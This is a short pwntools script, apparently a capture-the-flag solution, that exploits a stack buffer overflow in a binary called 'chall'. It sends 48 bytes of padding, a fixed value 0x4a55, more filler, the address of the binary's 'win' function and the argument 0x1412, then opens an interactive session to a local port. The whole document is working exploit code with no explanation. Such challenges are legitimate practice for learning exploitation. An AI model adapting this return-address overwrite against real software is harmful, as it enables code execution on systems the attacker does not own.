from pwn import *

elf = ELF("./chall")  

context.binary = elf

# io = process("./chall")
io = remote("0.0.0.0",1010)

# Offset to overwrite the return address
padding = 48 
# Call the win function with the correct argument (0x1412)
payload = b"A" * padding + p32(0x4a55) +  b"A"*12 + p32(elf.symbols.win) + p32(0x0) +p32(0x1412)
io.sendlineafter("input: ",payload)

io.interactive()